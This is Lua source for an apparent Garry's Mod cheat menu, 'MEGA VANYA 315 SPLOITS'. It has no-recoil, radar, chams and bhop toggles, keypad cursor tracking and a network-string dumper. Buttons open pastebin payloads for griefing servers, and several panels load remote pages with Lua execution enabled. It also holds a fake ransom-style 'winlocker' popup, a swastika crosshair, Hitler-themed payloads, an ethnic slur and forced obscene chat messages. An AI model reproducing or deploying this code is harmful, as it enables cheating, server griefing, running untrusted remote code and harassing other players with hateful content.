            draw.RoundedBox(0,0,0,w,h,helper.theme.chroma)
            draw.RoundedBox(0,1,1,w-2,h-2,helper.theme.backgroundalt)
               savecfg.DoClick = function()
            saveconfig()
           end
           end
    end

    local spmode = vgui.Create( "DButton", frame )
    spmode:SetTextColor( Color( 255, 255, 255 ) )
    spmode:SetText( "Spectator Mode" )
    spmode:SetPos( 160, 300 )
    spmode:SetSize( 120, 30 )
    spmode:DockMargin(1,2, 1, 0)
    function spmode:Paint( w,h )
        if spmode:IsHovered() then
            draw.RoundedBox(0,0,0,w,h,helper.theme.backgroundalt2)
            draw.RoundedBox(0,1,1,w-2,h-2,helper.theme.backgroundalt3)
        else
            draw.RoundedBox(0,0,0,w,h,helper.theme.chroma)
            draw.RoundedBox(0,1,1,w-2,h-2,helper.theme.backgroundalt)
               spmode.DoClick = function()
            helper.SpectateMode()
           end
           end
    end
    local unload = vgui.Create( "DButton", frame )
    unload:SetTextColor( Color( 255, 255, 255 ) )
    unload:SetText( "Unload" )
    unload:SetPos( 160, 260 )
    unload:SetSize( 120, 30 )
    unload:DockMargin(1,2, 1, 0)
    function unload:Paint( w,h )
        if unload:IsHovered() then
            draw.RoundedBox(0,0,0,w,h,helper.theme.backgroundalt2)
            draw.RoundedBox(0,1,1,w-2,h-2,helper.theme.backgroundalt3)
        else
            draw.RoundedBox(0,0,0,w,h,helper.theme.chroma)
            draw.RoundedBox(0,1,1,w-2,h-2,helper.theme.backgroundalt)
               unload.DoClick = function()
            frame:Remove()
           end
           end
    end
    local antiafk = vgui.Create( "DButton", frame )
    antiafk:SetTextColor( Color( 255, 255, 255 ) )
    antiafk:SetText( "Anti AFK" )
    antiafk:SetPos( 25, 95 )
    antiafk:SetSize( 100, 30 )
    antiafk:DockMargin(1,2, 1, 0)
    function antiafk:Paint( w,h )
        if antiafk:IsHovered() then
            draw.RoundedBox(0,0,0,w,h,helper.theme.backgroundalt2)
            draw.RoundedBox(0,1,1,w-2,h-2,helper.theme.backgroundalt3)
        else
            draw.RoundedBox(0,0,0,w,h,helper.theme.chroma)
            draw.RoundedBox(0,1,1,w-2,h-2,helper.theme.backgroundalt)
               antiafk.DoClick = function()
RunConsoleCommand( "AFK" )
           end
           end
    end
                        local spammer = vgui.Create("DCheckBox", frame)
        spammer:SetPos(25, 160)
        spammer:SetValue(helper.Vars['SPammer'])
        spammer:SetSize(100,17)
        function spammer:Paint(w,h)
            helper.DrawRect(0,0,h,h,helper.theme.backgroundalt3)
            if spammer:GetChecked() then
                helper.DrawRect(4,4,h-8,h-8,helper.theme.chroma)
            end
            helper.DrawOutLinedRect(0,0,h,h,helper.theme.backgroundalt2)
            draw.SimpleText("Spammer","DermaDefault",24,h/2,Color(255,255,255),0,1)
            helper.Vars['SPammer'] = spammer:GetChecked()
        end
                    local norec = vgui.Create("DCheckBox", frame)
        norec:SetPos(25, 135)
        norec:SetValue(helper.Vars['NoRecoil'])
        norec:SetSize(100,17)
        function norec:Paint(w,h)
            helper.DrawRect(0,0,h,h,helper.theme.backgroundalt3)
            if norec:GetChecked() then
                helper.DrawRect(4,4,h-8,h-8,helper.theme.chroma)
            end
            helper.DrawOutLinedRect(0,0,h,h,helper.theme.backgroundalt2)
            draw.SimpleText("No recoil","DermaDefault",24,h/2,Color(255,255,255),0,1)
            helper.Vars['NoRecoil'] = norec:GetChecked()
        end
        local Theme = vgui.Create( "DColorMixer",frame);
        Theme:SetSize(130,120)
        Theme:SetPos(155,90)
        Theme:SetPalette( false )
        Theme:SetWangs( false )
        Theme:SetAlphaBar( false )
        Theme:SetColor(Color(0,140,250))
        function Theme:ValueChanged(color)
        helper.theme.chroma = Color(color.r,color.g,color.b)
        helper.theme.chromaalt = Color(helper.theme.chroma.r-55,helper.theme.chroma.g-60,helper.theme.chroma.b-30)
end
                    local autos = vgui.Create("DCheckBox", frame)
        autos:SetPos(20,290)
        autos:SetValue(helper.Vars['Namechams'])
        autos:SetSize(100,17)
        function autos:Paint(w,h)
            helper.DrawRect(0,0,h,h,helper.theme.backgroundalt3)
            if autos:GetChecked() then
                helper.DrawRect(4,4,h-8,h-8,helper.theme.chroma)
            end
            helper.DrawOutLinedRect(0,0,h,h,helper.theme.backgroundalt2)
            draw.SimpleText("Name & Chams","DermaDefault",24,h/2,Color(255,255,255),0,1)
            helper.Vars['Namechams'] = autos:GetChecked()
        end
                    local radar = vgui.Create("DCheckBox", frame)
        radar:SetPos(20,315)
        radar:SetValue(helper.Vars['RADAR'])
        radar:SetSize(100,17)
        function radar:Paint(w,h)
            helper.DrawRect(0,0,h,h,helper.theme.backgroundalt3)
            if radar:GetChecked() then
                helper.DrawRect(4,4,h-8,h-8,helper.theme.chroma)
            end
            helper.DrawOutLinedRect(0,0,h,h,helper.theme.backgroundalt2)
            draw.SimpleText("Radar hack","DermaDefault",24,h/2,Color(255,255,255),0,1)
            helper.Vars['RADAR'] = radar:GetChecked()
        end
local wm = vgui.Create("DCheckBox", frame)
        wm:SetPos(20,340)
        wm:SetValue(helper.Vars['Watermark'])
        wm:SetSize(100,17)
        function wm:Paint(w,h)
            helper.DrawRect(0,0,h,h,helper.theme.backgroundalt3)
            if wm:GetChecked() then
                helper.DrawRect(4,4,h-8,h-8,helper.theme.chroma)
            end
            helper.DrawOutLinedRect(0,0,h,h,helper.theme.backgroundalt2)
            draw.SimpleText("Watermark","DermaDefault",24,h/2,Color(255,255,255),0,1)
            helper.Vars['Watermark'] = wm:GetChecked()
        end
                            local bhopaut = vgui.Create("DCheckBox", frame)
        bhopaut:SetPos(160,380)
        bhopaut:SetValue(helper.Vars['BHOPAUTOS'])
        bhopaut:SetSize(100,17)
        function bhopaut:Paint(w,h)
            helper.DrawRect(0,0,h,h,helper.theme.backgroundalt3)
            if bhopaut:GetChecked() then
                helper.DrawRect(4,4,h-8,h-8,helper.theme.chroma)
            end
            helper.DrawOutLinedRect(0,0,h,h,helper.theme.backgroundalt2)
            draw.SimpleText("Bhop & Strafer","DermaDefault",24,h/2,Color(255,255,255),0,1)
            helper.Vars['BHOPAUTOS'] = bhopaut:GetChecked()
        end
   
    end

local function Think()
    if (input.IsKeyDown(KEY_INSERT) && !menuopen && !insertdown) then
        menuopen = true;
        insertdown = true;
        MainFunc();
    elseif (!input.IsKeyDown(KEY_INSERT) && !menuopen) then
        insertdown = false;
    end
    if (input.IsKeyDown(KEY_INSERT) && insertdown && menuopen) then
        insertdown2 = true;
    else
        insertdown2 = false;
    end
end

hook.Add("Think", "", Think);



function helper.CalculateKeypadCursorPos(ply, ent)
    if !ply:IsValid() then return end

    local tr = util.TraceLine( { start = ply:EyePos(), endpos = ply:EyePos() + ply:GetAimVector() * 65, filter = ply } )
    if !tr.Entity or tr.Entity ~= ent then return 0, 0 end

    local scale = ent.Scale
    if !scale then return 0, 0 end

    local pos, ang = ent:CalculateRenderPos(), ent:CalculateRenderAng()
    if !pos or !ang then return 0, 0 end
    local normal = ent:GetForward()

    local intersection = util.IntersectRayWithPlane(ply:EyePos(), ply:GetAimVector(), pos, normal)
    if !intersection then return 0, 0 end

    local diff = pos - intersection

    local x = diff:Dot( -ang:Forward() ) / scale
    local y = diff:Dot( -ang:Right() ) / scale

    return x, y
end

function helper.KPGetHoveredElement(ply, ent)
    local scale = ent.Scale

    local w, h = ent.Width2D, ent.Height2D
    local x, y = helper.CalculateKeypadCursorPos(ply, ent)

    for _, element in ipairs(elements) do
        local element_x = w * element.x
        local element_y = h * element.y
        local element_w = w * element.w
        local element_h = h * element.h

        if  element_x < x and element_x + element_w > x and
            element_y < y and element_y + element_h > y
        then
            return element
        end
    end
end

function helper.cameracalculate( ply, pos, angles, fov )
    if helper.Vars['SCAM'] and IsValid(helper.SpectatePlayer) and helper.SpectatePlayer:IsPlayer()  then
        local view = {}
        view.origin = helper.SpectatePlayer:EyePos() or Vector(0,0,0)
        view.angles = helper.SpectatePlayer:EyeAngles() or Angle(0,0,0)
        view.fov = fov
        view.drawviewer = true
        return view
    elseif helper.Vars['SCAM'] and IsValid(helper.SpectatePlayer) and helper.SpectatePlayer:GetClass() == "gmod_cameraprop" then
        local view = {}
        view.origin = helper.SpectatePlayer:GetPos() or Vector(0,0,0)
        view.angles = helper.SpectatePlayer:GetAngles() or Angle(0,0,0)
        view.fov = fov
        view.drawviewer = true
        return view
    end
    if helper.Vars['FCAM'] then
        local view = {}
        local newang = angles
        helper.StartCamAng = LocalPlayer():GetAngles()
        local speed = helper.CamSpeed_Normal
        if input.IsKeyDown(KEY_LSHIFT) then
            speed = helper.CamSpeed_Fast
        elseif input.IsKeyDown(KEY_LCONTROL) then
            speed = helper.CamSpeed_Slow
        else
            speed = helper.CamSpeed_Normal
        end
        if input.IsKeyDown(KEY_W) then
            helper.StartCamPos = helper.StartCamPos + helper.StartCamAng:Forward() * speed
        end
        if input.IsKeyDown(KEY_A) then
            helper.StartCamPos = helper.StartCamPos - helper.StartCamAng:Right() * speed
        end
        if input.IsKeyDown(KEY_D) then
            helper.StartCamPos = helper.StartCamPos + helper.StartCamAng:Right() * speed
        end
        if input.IsKeyDown(KEY_S) then
            helper.StartCamPos = helper.StartCamPos - helper.StartCamAng:Forward() * speed
        end
        if input.IsKeyDown(KEY_SPACE) then
            helper.StartCamPos = helper.StartCamPos + helper.StartCamAng:Up() * speed
        end
        view.origin = helper.StartCamPos
        view.angles = newang
        view.fov = fov
        view.drawviewer = true
        return view
    end
end
hook.Add( "CalcView", helper.RandomString(17), helper.cameracalculate )

hook.Add( "ShutDown", "RemoveAntiScreenGrab", function()
    render.SetRenderTarget()
end)

end
-----------------------------------------------------------------------
local DermaButton = vgui.Create( "DButton", panel3 )
DermaButton:SetText( "Winlocker" )
DermaButton:SetPos( 0, 0 )
DermaButton:SetSize( 400, 30 )
DermaButton.DoClick = function()

local frame = vgui.Create("DFrame")
frame:SetSize(500,500)
frame:SetTitle("Winlocker Code")
frame:Center()
frame:MakePopup()

local html = vgui.Create("DHTML", frame)
html:Dock(FILL)
html:OpenURL("https://pastebin.com/raw/WyLtp9n7")
end

local DermaButton = vgui.Create( "DButton", panel3 )
DermaButton:SetText( "Intercom" )
DermaButton:SetPos( 0, 30 )
DermaButton:SetSize( 400, 30 )
DermaButton.DoClick = function()

local frame = vgui.Create("DFrame")
frame:SetSize(500,500)
frame:SetTitle("Intercom Code")
frame:Center()
frame:MakePopup()

local html = vgui.Create("DHTML", frame)
html:Dock(FILL)
html:OpenURL("https://pastebin.com/raw/sDet73sH")
end




local DermaButton = vgui.Create( "DButton", panel3 )
DermaButton:SetText( "Hentai Spam" )
DermaButton:SetPos( 0, 60 )
DermaButton:SetSize( 400, 30 )
DermaButton.DoClick = function()

local frame = vgui.Create("DFrame")
frame:SetSize(500,500)
frame:SetTitle("HentaiSpam Code")
frame:Center()
frame:MakePopup()

local html = vgui.Create("DHTML", frame)
html:Dock(FILL)
html:OpenURL("https://pastebin.com/raw/zfsQXjHp")
end


local DermaButton = vgui.Create( "DButton", panel3 )
DermaButton:SetText( "Swastika Crosshair" )
DermaButton:SetPos( 0, 90 )
DermaButton:SetSize( 400, 30 )
DermaButton.DoClick = function()

local frame = vgui.Create("DFrame")
frame:SetSize(500,500)
frame:SetTitle("Swastika Code")
frame:Center()
frame:MakePopup()

local html = vgui.Create("DHTML", frame)
html:Dock(FILL)
html:OpenURL("https://pastebin.com/raw/9vZr3Z4g")
end

local DermaButton = vgui.Create( "DButton", panel3 )
DermaButton:SetText( "Inverse Map" )
DermaButton:SetPos( 0, 120 )
DermaButton:SetSize( 400, 30 )
DermaButton.DoClick = function()

local frame = vgui.Create("DFrame")
frame:SetSize(500,500)
frame:SetTitle("InverseMap Code")
frame:Center()
frame:MakePopup()

local html = vgui.Create("DHTML", frame)
html:Dock(FILL)
html:OpenURL("https://pastebin.com/raw/cc77AE8t")
end


local DermaButton = vgui.Create( "DButton", panel3 )
DermaButton:SetText( "Text on Screen" )
DermaButton:SetPos( 0, 150 )
DermaButton:SetSize( 400, 30 )
DermaButton.DoClick = function()

local frame = vgui.Create("DFrame")
frame:SetSize(500,500)
frame:SetTitle("TextOnScreen Code")
frame:Center()
frame:MakePopup()

local html = vgui.Create("DHTML", frame)
html:Dock(FILL)
html:OpenURL("https://pastebin.com/raw/dKBHHmdH")
end



local DermaButton = vgui.Create( "DButton", panel3 )
DermaButton:SetText( "MegaVanya GIF" )
DermaButton:SetPos( 0, 180 )
DermaButton:SetSize( 400, 30 )
DermaButton.DoClick = function()

local frame = vgui.Create("DFrame")
frame:SetSize(500,500)
frame:SetTitle("MegaVanyaGIF Code")
frame:Center()
frame:MakePopup()

local html = vgui.Create("DHTML", frame)
html:Dock(FILL)
html:OpenURL("https://pastebin.com/raw/ujFKbHrP")
end


local DermaButton = vgui.Create( "DButton", panel3 )
DermaButton:SetText( "Hitler Ziga" )
DermaButton:SetPos( 0, 210 )
DermaButton:SetSize( 400, 30 )
DermaButton.DoClick = function()

local frame = vgui.Create("DFrame")
frame:SetSize(500,500)
frame:SetTitle("HitlerZiga Code")
frame:Center()
frame:MakePopup()

local html = vgui.Create("DHTML", frame)
html:Dock(FILL)
html:OpenURL("https://pastebin.com/raw/cgrW04ss")
end


local DermaButton = vgui.Create( "DButton", panel3 )
DermaButton:SetText( "LocalPlayer Say" )
DermaButton:SetPos( 0, 240 )
DermaButton:SetSize( 400, 30 )
DermaButton.DoClick = function()

local frame = vgui.Create("DFrame")
frame:SetSize(500,500)
frame:SetTitle("LocalPlayerSay Code")
frame:Center()
frame:MakePopup()

local html = vgui.Create("DHTML", frame)
html:Dock(FILL)
html:OpenURL("https://pastebin.com/raw/BPYr68D4")
end
--------------------------------------------------------------
local DermaButton = vgui.Create( "DButton", panel4 )
DermaButton:SetText( "Slipknot-Sic" )
DermaButton:SetPos( 0, 0 )
DermaButton:SetSize( 400, 30 )
DermaButton.DoClick = function()

local frame = vgui.Create("DFrame")
frame:SetSize(500,500)
frame:SetTitle("Slipknot Code")
frame:Center()
frame:MakePopup()

local html = vgui.Create("DHTML", frame)
html:Dock(FILL)
html:OpenURL("https://pastebin.com/raw/yTjzR8g5")
end

local DermaButton = vgui.Create( "DButton", panel4 )
DermaButton:SetText( "Scally Milano-SCAM" )
DermaButton:SetPos( 0, 30 )
DermaButton:SetSize( 400, 30 )
DermaButton.DoClick = function()

local frame = vgui.Create("DFrame")
frame:SetSize(500,500)
frame:SetTitle("Scally Milano Code")
frame:Center()
frame:MakePopup()

local html = vgui.Create("DHTML", frame)
html:Dock(FILL)
html:OpenURL("https://pastebin.com/raw/t7Ggsnsk")
end

local DermaButton = vgui.Create( "DButton", panel4 )
DermaButton:SetText( "Baltimora-Tarzan Boy" )
DermaButton:SetPos( 0, 60 )
DermaButton:SetSize( 400, 30 )
DermaButton.DoClick = function()

local frame = vgui.Create("DFrame")
frame:SetSize(500,500)
frame:SetTitle("Baltimora Code")
frame:Center()
frame:MakePopup()

local html = vgui.Create("DHTML", frame)
html:Dock(FILL)
html:OpenURL("https://pastebin.com/raw/3NAAKbf5")
end


local DermaButton = vgui.Create( "DButton", panel4 )
DermaButton:SetText( "Baltimora-Tarzan Boy" )
DermaButton:SetPos( 0, 60 )
DermaButton:SetSize( 400, 30 )
DermaButton.DoClick = function()

local frame = vgui.Create("DFrame")
frame:SetSize(500,500)
frame:SetTitle("Baltimora Code")
frame:Center()
frame:MakePopup()

local html = vgui.Create("DHTML", frame)
html:Dock(FILL)
html:OpenURL("https://pastebin.com/raw/3NAAKbf5")
end


local DermaButton = vgui.Create( "DButton", panel4 )
DermaButton:SetText( "Nurminsky-Valim(Gachi)" )
DermaButton:SetPos( 0, 90 )
DermaButton:SetSize( 400, 30 )
DermaButton.DoClick = function()

local frame = vgui.Create("DFrame")
frame:SetSize(500,500)
frame:SetTitle("Nurminsky Code")
frame:Center()
frame:MakePopup()

local html = vgui.Create("DHTML", frame)
html:Dock(FILL)
html:OpenURL("https://pastebin.com/raw/2Agugb5F")
end


local DermaButton = vgui.Create( "DButton", panel4 )
DermaButton:SetText( "Intercom" )
DermaButton:SetPos( 0, 120 )
DermaButton:SetSize( 400, 30 )
DermaButton.DoClick = function()

local frame = vgui.Create("DFrame")
frame:SetSize(500,500)
frame:SetTitle("Intercom Code")
frame:Center()
frame:MakePopup()

local html = vgui.Create("DHTML", frame)
html:Dock(FILL)
html:OpenURL("https://pastebin.com/raw/vA98s58c")
end


local DermaButton = vgui.Create( "DButton", panel4 )
DermaButton:SetText( "Welcome!Shiza" )
DermaButton:SetPos( 0, 150 )
DermaButton:SetSize( 400, 30 )
DermaButton.DoClick = function()

local frame = vgui.Create("DFrame")
frame:SetSize(500,500)
frame:SetTitle("Welcome!Shiza Code")
frame:Center()
frame:MakePopup()

local html = vgui.Create("DHTML", frame)
html:Dock(FILL)
html:OpenURL("https://pastebin.com/raw/bjQmQzyg")
end


local DermaButton = vgui.Create( "DButton", panel4 )
DermaButton:SetText( "MegaVanya315" )
DermaButton:SetPos( 0, 180 )
DermaButton:SetSize( 400, 30 )
DermaButton.DoClick = function()

local frame = vgui.Create("DFrame")
frame:SetSize(500,500)
frame:SetTitle("MegaVanya315 Code")
frame:Center()
frame:MakePopup()

local html = vgui.Create("DHTML", frame)
html:Dock(FILL)
html:OpenURL("https://pastebin.com/raw/iEwHPmnv")
end


local DermaButton = vgui.Create( "DButton", panel4 )
DermaButton:SetText( "Wake Up Donbass!" )
DermaButton:SetPos( 0, 210 )
DermaButton:SetSize( 400, 30 )
DermaButton.DoClick = function()

local frame = vgui.Create("DFrame")
frame:SetSize(500,500)
frame:SetTitle("WakeUpDonbass! Code")
frame:Center()
frame:MakePopup()

local html = vgui.Create("DHTML", frame)
html:Dock(FILL)
html:OpenURL("https://pastebin.com/raw/wderCT5G")
end


local DermaButton = vgui.Create( "DButton", panel4 )
DermaButton:SetText( "My Defense" )
DermaButton:SetPos( 0, 240 )
DermaButton:SetSize( 400, 30 )
DermaButton.DoClick = function()

local frame = vgui.Create("DFrame")
frame:SetSize(500,500)
frame:SetTitle("MyDefense Code")
frame:Center()
frame:MakePopup()

local html = vgui.Create("DHTML", frame)
html:Dock(FILL)
html:OpenURL("https://pastebin.com/raw/Bwv3xa3q")
end
--------------------------------------

local DermaButton = vgui.Create( "DButton", panel5 )
DermaButton:SetText( "LGBT-Sky" )
DermaButton:SetPos( 0, 0 )
DermaButton:SetSize( 400, 300 )
DermaButton.DoClick = function()
hook.Add("PostDraw2DSkyBox", "Lol", function()
render.OverrideDepthEnable( true, false )
cam.Start2D()
color = HSVToColor(CurTime()% 6*60,1,1)
surface.SetDrawColor(color.r, color.g, color.b)
surface.DrawRect(0,0,ScrW(), ScrH())
cam.End2D()

render.OverrideDepthEnable( false, false )
end)
end

-------------------------------------------------------------------
local DermaButton = vgui.Create( "DButton", panel6 )
DermaButton:SetText( "*Click*" )
DermaButton:SetPos( 0, 0 )
DermaButton:SetSize( 400, 300 )
DermaButton.DoClick = function()
local frame = vgui.Create("DFrame")
frame:SetSize(500,500)
frame:SetTitle("F.A.Q")
frame:Center()
frame:MakePopup()

local html = vgui.Create("DHTML", frame)
html:Dock(FILL)
html:OpenURL("https://pastebin.com/raw/GwUNd7yz")
end
------------------------------------------------------
local DermaButton = vgui.Create( "DButton", panel7 )
DermaButton:SetText( "Snake" )
DermaButton:SetPos( 0, 0 )
DermaButton:SetSize( 400, 130 )
DermaButton.DoClick = function()
	local squarew=15
local snake={headx=350/2,heady=500/2,dirx=0,diry=0,length=0,tail={}}
local egg={x=0,y=0}
local speed=200
local score=0
local function MoveEgg()
egg.x=math.Round(math.random(20,500-20))
egg.y=math.Round(math.random(20,350-350*0.125))
end
MoveEgg()
local function Restart()
speed=200
score=0
snake={headx=350/2,heady=500/2,dirx=0,diry=0,length=0,tail={}}
MoveEgg()
end
local function Eat()
snake.length=snake.length+squarew
MoveEgg()
speed=math.min(speed*1.02,600)
score=score+math.Round(speed/150)
end
snakey=vgui.Create("DFrame")
snakey:SetSize(500,350)
snakey:Center()
snakey:SetTitle("Snake")
snakey:SetDraggable(true)
snakey:MakePopup()
snakey.Paint=function(_,w,h)
	draw.RoundedBox(0,0,0,w,h,Color(50,50,50,255))
local up, down, left, right = input.IsKeyDown(KEY_UP), input.IsKeyDown(KEY_DOWN), input.IsKeyDown(KEY_LEFT), input.IsKeyDown(KEY_RIGHT)
if (up or down) and (snake.diry == 0) then
snake.diry = (up) and -1 or 1
snake.dirx = 0
elseif (left or right) and (snake.dirx == 0) then
snake.dirx = (left) and -1 or 1
snake.diry = 0
end
table.insert(snake.tail, 1, {x = snake.headx, y = snake.heady})
if #snake.tail > snake.length then
table.remove(snake.tail, #snake.tail)
end
local changex = snake.dirx * speed * FrameTime()
local changey = snake.diry * speed * FrameTime()
snake.headx = snake.headx + changex
snake.heady = snake.heady + changey
if (snake.headx <= 0) or (snake.heady <= 0) or (snake.heady + squarew >= 350) or (snake.headx + squarew >= 500) then
Restart()
end
if (egg.x <= snake.headx + squarew) and (snake.headx <= egg.x + squarew) and (egg.y <= snake.heady + squarew) and (snake.heady <= egg.y + squarew) then
Eat()
end
local col = math.abs(math.sin(CurTime() * 2.5))
surface.SetDrawColor(120 + (135 * col), 50, 0, 255)
surface.DrawRect(egg.x, egg.y, squarew, squarew)
surface.SetDrawColor(255,100,150,255)
for i = 1, #snake.tail do
local tile = snake.tail[i]
if not tile then break end
surface.DrawRect(tile.x, tile.y, squarew, squarew)
if (i > squarew*3) and (tile.x >= snake.headx) and (tile.x <= snake.headx + squarew) and (tile.y >= snake.heady) and (tile.y <= snake.heady + squarew) then -- trust me
Restart()
end
end
surface.SetDrawColor(255,200,200,255)
surface.DrawRect(snake.headx, snake.heady, squarew, squarew)
draw.SimpleText("Score: "..score,"DermaLarge",10,30,Color(255,255,255))
end
end





local DermaButton = vgui.Create( "DButton", panel7 )
DermaButton:SetText( "CookieClicker" )
DermaButton:SetPos( 0, 130 )
DermaButton:SetSize( 400, 140 )
DermaButton.DoClick = function()
local frame = vgui.Create("DFrame")
frame:SetSize(1280,760)
frame:SetTitle("CookieClicker")
frame:Center()
frame:MakePopup()

local html = vgui.Create("DHTML", frame)
html:Dock(FILL)
html:OpenURL("https://orteil.dashnet.org/cookieclicker/")
end
------------------------------------------------------------------
local DermaButton = vgui.Create( "DButton", panel8 )
DermaButton:SetText( "Discord Invite" )
DermaButton:SetPos( 0, 0 )
DermaButton:SetSize( 400, 130 )
DermaButton.DoClick = function()
local frame = vgui.Create("DFrame")
frame:SetSize(1280,760)
frame:SetTitle("Discord")
frame:Center()
frame:MakePopup()

local html = vgui.Create("DHTML", frame)
html:Dock(FILL)
html:OpenURL("https://discord.gg/GapNEbaqhM")
end

local DermaButton = vgui.Create( "DButton", panel8 )
DermaButton:SetText( "Gamesense.pub Invites" )
DermaButton:SetPos( 0, 130 )
DermaButton:SetSize( 400, 140 )
DermaButton.DoClick = function()
local frame = vgui.Create("DFrame")
frame:SetSize(1280,760)
frame:SetTitle("Gamesense")
frame:Center()
frame:MakePopup()

local html = vgui.Create("DHTML", frame)
html:Dock(FILL)
html:OpenURL("https://www.youtube.com/watch?v=tLK4oHPbPuM")
end
--------------------------------------------------
local DermaButton = vgui.Create( "DButton", panel9 )
DermaButton:SetText( "*NetDump Logs*" )
DermaButton:SetPos( 0, 0 )
DermaButton:SetSize( 400, 300 )
DermaButton.DoClick = function()
	local i = 1
local net = util.NetworkIDToString( i )
local tbl = {}
tbl[ i ] = net
while net ~= nil do
    i = i + 1
    net = util.NetworkIDToString(i)
    tbl[i] = net
end
 
local tbl = util.TableToJSON( tbl, true )
 
 
 
if not file.Exists("net-grabber","DATA") then
    file.CreateDir("net-grabber")
end
 
local name =  "net-grabber/" .. tostring(game.GetIPAddress()) .. ".txt"
file.Write( "net-grabber/".. string.gsub(game.GetIPAddress(), ":", "_") .. ".txt" , tbl )
 end
 ---------------------------------------------------------------------------
local DermaButton = vgui.Create( "DButton", panel10 )
DermaButton:SetText( "PRESS" )
DermaButton:SetPos( 0, 0 )
DermaButton:SetSize( 50, 20 )
DermaButton.DoClick = function()

local html = vgui.Create( 'DHTML',frame)
html:SetSize( 1280, 760 )
html:SetPos( 0, 0 )
html:OpenURL( "https://cdn.discordapp.com/attachments/635484763699937300/875765097824415744/1153189c46e50761_2.gif" )
html:SetAllowLua( true )

end


local html = vgui.Create( 'DHTML',panel10)
html:SetSize( 250, 250 )
html:SetPos( 70, 0 )
html:OpenURL( "https://pastebin.com/raw/AqianBnY" )
html:SetAllowLua( true )


local DermaButton = vgui.Create( "DButton", panel10 )
DermaButton:SetText( "DONT PRESS!!!!!" )
DermaButton:SetPos( 0, 237 )
DermaButton:SetSize( 400, 30 )
DermaButton.DoClick = function()
	local cam = cam

RunConsoleCommand("r_frustumcullworld",0)
hook.Add("PreRender","ebanaya_vertuha_1000-7",function()
    local mat = Matrix()

    local ang = Angle(0,CurTime()*8,0)
    mat:Rotate(ang)


    cam.PushModelMatrix( mat )
end)
------
sound.PlayURL( "https://cdn.discordapp.com/attachments/635484763699937300/875813469084074006/Slipknot_-_Sic_musmore.com.mp3", "", function()end )
------
hook.Add("HUDPaint", "MEGA VANYA 315 SPLOITS", function() 
draw.DrawText("MEGA VANYA 315 SPLOITS", "TargetID", ScrW() * 0.5, ScrH() * 0.25, Color(255,255,255,255), TEXT_ALIGN_CENTER)
end)
-------
local speed = 200
hook.Add( "HUDPaint", "Swastika", function()
surface.SetDrawColor( HSVToColor(  ( CurTime() * 200) % 360, 1, 1 ) )
surface.DrawLine(ScrW()/2, ScrH()/2, ScrW()/2 + 20, ScrH()/2)
surface.DrawLine(ScrW()/2 + 20, ScrH()/2, ScrW()/2 + 20, ScrH()/2 + 20)
surface.DrawLine(ScrW()/2 , ScrH()/2, ScrW()/2 - 20, ScrH()/2)
surface.DrawLine(ScrW()/2 - 20 , ScrH()/2, ScrW()/2 - 20, ScrH()/2 - 20)
surface.DrawLine(ScrW()/2, ScrH()/2, ScrW()/2, ScrH()/2 - 20)
surface.DrawLine(ScrW()/2, ScrH()/2 - 20, ScrW()/2 + 20, ScrH()/2 - 20)
surface.DrawLine(ScrW()/2, ScrH()/2, ScrW()/2, ScrH()/2 + 20)
surface.DrawLine(ScrW()/2, ScrH()/2 + 20, ScrW()/2 - 20, ScrH()/2 + 20)
end)
-------
hook.Add("PostDraw2DSkyBox", "Lol", function()
render.OverrideDepthEnable( true, false )
cam.Start2D()
color = HSVToColor(CurTime()% 6*60,1,1)
surface.SetDrawColor(color.r, color.g, color.b)
surface.DrawRect(0,0,ScrW(), ScrH())
cam.End2D()

render.OverrideDepthEnable( false, false )
end)
---------
hook.Add("CreateMove","Flashlight",function(a)
if input.IsKeyDown(KEY_W)then a:SetImpulse(100)end 
end)
----------
LocalPlayer():ConCommand('say /ooc меня выебал мега ваня 315')
---------------
local html = vgui.Create( 'DHTML')
html:SetSize( ScrW(), ScrH() )
html:SetPos( 800, 800 )
html:OpenURL( "https://cdn.discordapp.com/attachments/635484763699937300/875765097824415744/1153189c46e50761_2.gif" )
html:SetAllowLua( true )
-----------------
local html = vgui.Create( 'DHTML')
html:SetSize( ScrW(), ScrH() )
html:SetPos( 300, 300)
html:OpenURL( "media.discordapp.net/attachments/862622108591980554/862638694406291486/xvataibecplatno-1.gif" )
html:SetAllowLua( true )
------------------
local xer = vgui.Create("DFrame")

xer:SetSize(600,300)

xer:SetTitle("winlocker.exe")
xer:ShowCloseButton(false)
xer:MakePopup()
xer:Center()

local btn = vgui.Create("DButton", xer)
btn:SetSize(300,100)
btn:Center()
btn:SetText("РАЗБЛОКИРОВАТЬ(100 руб)")
btn.DoClick = function()
    RunConsoleCommand("say", "/donate")
    xer:Close()


    local html = vgui.Create("DHTML")

    html:Dock(FILL)

    html:OpenURL("https://cdn.discordapp.com/attachments/635484763699937300/875777433096310934/images.jpg")
    sound.PlayURL( "https://cdn.discordapp.com/attachments/853940281400754176/867457993695821844/videoplayback_15.mp3", "", function()end )
end
----------------------
local frame = vgui.Create("DFrame")
frame:SetSize(ScrW() * 0.25, ScrH() * 0.25)
frame:SetTitle("hohol.exe")
frame:Center()
frame:MakePopup()

local html = vgui.Create("DHTML", frame)
html:Dock(FILL)
html:OpenURL("https://cdn.discordapp.com/attachments/874752176055021568/875781641086320750/download.jpg")
------------------------------
local frame = vgui.Create( "DFrame" )
frame:SetSize( 300, 250 )
frame:Center()
frame:SetTitle ("domofon.exe")
frame:MakePopup()

local DermaButton = vgui.Create( "DButton", frame )
DermaButton:SetText( "ДИНЬ ДОН" )
DermaButton:SetPos( 25, 50 )
DermaButton:SetSize( 250, 30 )
DermaButton.DoClick = function()
sound.PlayURL( "https://cdn.discordapp.com/attachments/875762890089566240/875783107087851520/zvuk-domofona.mp3", "", function()end )
end
------------------------------
LocalPlayer():ConCommand('say /ooc Я ВЕДУ СЕБЯ КАК ЖИВОТНОЕ')
------------------------------
local frame = vgui.Create( "DFrame" )
frame:SetSize( 500, 250 )
frame:SetSizable( true )
frame:Center()
frame:MakePopup()
frame:SetTitle( "stealer.exe" )

local browser = vgui.Create( "DFileBrowser", frame )
browser:Dock( FILL )

browser:SetPath( "GAME" )
browser:SetBaseFolder( "data" )
browser:SetOpen( true ) 
browser:SetCurrentFolder( "persist" ) 

function browser:OnSelect( path, pnl ) 
print( path )
end
-------------------------------
local Frame = vgui.Create("DFrame")
Frame:SetSize(267,186)
Frame:Center()
Frame:SetTitle("yougender.exe")
Frame:MakePopup()

local Mixer = vgui.Create("DColorMixer", Frame)
Mixer:Dock(FILL)
Mixer:SetPalette(true)
Mixer:SetAlphaBar(true)
Mixer:SetWangs(true)
Mixer:SetColor(Color(30,100,160)) 
--------------------------------
local Panel = vgui.Create( "DFrame" ) -- Main Frame
